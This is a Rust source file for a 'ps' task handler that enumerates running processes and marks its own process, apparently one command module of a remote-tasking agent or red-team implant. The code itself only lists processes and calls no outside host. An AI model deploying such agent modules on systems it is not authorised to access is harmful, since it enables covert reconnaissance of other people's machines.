use crate::internal::listener::{TaskHandler};
use sysinfo::{ProcessExt, System, SystemExt, RefreshKind};

pub static COMMAND: &str = "ps";
pub struct Command {}

impl TaskHandler for Command {
    fn handle(&self, _: String, args: Vec<String>) -> Result<String, Box<dyn std::error::Error>> {
        #[cfg(any(feature = "debug_assertions", feature = "debug"))]
        println!("Executing command `{}` with args `{:?}`", COMMAND, args.clone());

        if args.len() != 0 {
            return Ok("Invalid number of arguments received. Usage: 'ps'.".to_string());
        }

        let refresh_kind = RefreshKind::new().with_processes();
        let sys = System::new_with_specifics(refresh_kind);

        let mut output = format!("List of processes\n\n");

        #[cfg(target_os = "windows")]
        output.push_str(format!("{:<6}  {:<6}  {:<60}\n", "PID", "PPID", "NAME").as_str());
        #[cfg(target_os = "windows")]
        output.push_str(format!("{empty:-<6}  {empty:-<6}  {empty:-<60}\n", empty="").as_str());

        #[cfg(not(target_os = "windows"))]
        output.push_str(format!("{:<6}  {:<6}  {:<8}  {:<60}\n", "PID", "PPID", "USER", "NAME").as_str());
        #[cfg(not(target_os = "windows"))]
        output.push_str(format!("{empty:-<6}  {empty:-<6}  {empty:-<8} {empty:-<60}\n", empty="").as_str());

        let current_process = std::process::id() as i32;

        for (pid, process) in sys.processes() {
            let mut process_name: String = process.name().to_string();

            #[cfg(target_os = "windows")]
            let is_current_process: bool = pid.clone() == current_process as usize;
            #[cfg(not(target_os = "windows"))]
            let is_current_process: bool = pid.clone() == current_process;

            if  is_current_process {
                process_name = format!("[YOU ARE HERE] {}", process.name());
            }

            #[cfg(target_os = "windows")]
            output.push_str(format!(
                "{:<6}  {:<6}  {:<60}\n",
                pid,
                process.parent().unwrap_or(pid.clone()),
                process_name,
            ).as_str());

            #[cfg(not(target_os = "windows"))]
            output.push_str(format!(
                "{:<6}  {:<6}  {:<8}  {:<60}\n",
                pid,
                process.parent().unwrap_or(pid.clone()),
                process.uid,
                process_name,
            ).as_str());
        }

        Ok(output)
    }
}